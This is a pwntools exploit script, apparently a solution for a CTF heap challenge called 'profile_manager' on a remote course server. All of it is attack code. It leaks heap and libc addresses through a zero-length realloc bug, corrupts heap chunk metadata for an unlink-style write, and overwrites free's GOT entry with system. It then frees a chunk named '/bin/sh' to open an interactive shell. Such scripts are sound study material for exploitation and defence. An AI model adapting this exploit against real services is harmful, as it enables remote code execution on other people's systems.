from pwn import *
import time

DELTA = 0.1

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF('./libc.so.6')

r = remote('csie.ctf.tw', 10140)
#r = process("./profile_manager", env = {"LD_PRELOAD": "libc.so.6"})
#gdb.attach(proc.pidof(r)[0])

def add(name, age, length, description):
    print("add : name = {} age = {} length = {} description = {}".format(name, age, length, description))
    r.sendafter(":", "1")
    time.sleep(DELTA)
    r.sendafter(":", name)
    time.sleep(DELTA)
    r.sendafter(":", str(age).encode('ascii'))
    time.sleep(DELTA)
    assert(length > 0x90)
    r.sendafter(":", str(length).encode('ascii'))
    time.sleep(DELTA)
    r.sendafter(":", description)
    time.sleep(DELTA)

def show(ID):
    print("show : ID = {}".format(ID))
    r.sendafter(":", "2")
    time.sleep(DELTA)
    r.sendafter(":", str(ID).encode('ascii'))
    time.sleep(DELTA)
    return r.recvuntil(b"===================================").rstrip(b"===================================")

def edit(ID, name, age, description):
    print("edit : ID = {} name = {} age = {} description = {}".format(ID, name, age, description))
    r.sendafter(":", "3")
    time.sleep(DELTA)
    r.sendafter(":", str(ID).encode('ascii'))
    time.sleep(DELTA)
    r.sendafter(":", name)
    time.sleep(DELTA)

    # successfully free address that cause by 0-length realloc
    if name[0] == 0:
        print("Realloc Error!")
        return

    r.sendafter(":", str(age).encode('ascii'))
    time.sleep(DELTA)
    r.sendafter(":", description)
    time.sleep(DELTA)

def delete(ID):
    print("delete : ID = {}".format(ID))
    r.sendafter(":", "4")
    time.sleep(DELTA)
    r.sendafter(":", str(ID).encode('ascii'))
    time.sleep(DELTA)

add('A', 1, 200, 'A') # 0
add('B', 1, 200, 'B') # 1
add('C', 1, 200, 'C') # 2
delete(0)
delete(1)
delete(2)
add('A', 1, 200 + 32, 'A')
add(b'\x00', 1, 200, 'B')
add('C', 1, 200, 'C')

# leak heap base address
edit(1, 'B', 1, 'B')
heap_base = u64(show(1)[9:].split(b'=')[0].strip().ljust(8, b'\x00')) & 0xffffffffffffff00
print("heap base address :", hex(heap_base))

# leak libc base address
edit(1, 'B' * 8, 1, 'B')
libc.address = u64(show(1)[17:].split(b'=')[0].strip().ljust(8, b'\x00')) - 88 - 0x10 - libc.symbols[b"__malloc_hook"]
print("libc base address :", hex(libc.address))

chunk_size = 0x3c0
p = 0x602100
free_got = 0x602018

edit(1, b'\x00', 1, 'B') # free 1's name
delete(0)
delete(1)
add(p64(heap_base + 0x10), 1, 200, 'A') # 0
add(b'B' * 8 + p64(0x21), 1, 200, 'B')  # 1
add('C', 1, 200, 'C')                   # 3
add(b'D' * 8 + p64(chunk_size + 1), 1, 200, flat([0, 0, 0, 0xb1]).ljust(200 - 1, b'D'))   # 4

delete(1)
add('B', 1, chunk_size - 0x10, flat([
    *([0] * ((192) // 8)),
    0, 0x21,
    0, 0,
    0, 0x121,
    *([0] * ((0x120 - 0x10 - 0x10 - 0x20) // 8)),
    0, 0x21,
    0, 0,
    0, 0xd1,
    0, 0xc1,
    p + 0x40 - 0x18, p + 0x40 - 0x10,
    *([0] * ((192 - 0x20) // 8)),
    0xc0, 0xd0
]))
edit(3, b'\x00', 1, 'A')
edit(2, 'A', 1, p64(free_got)[:(len(hex(heap_base)[2:]) + 1) // 2])
edit(1, '/bin/sh\x00', 1, p64(libc.symbols[b"system"])[:6])
delete(1)

r.interactive()
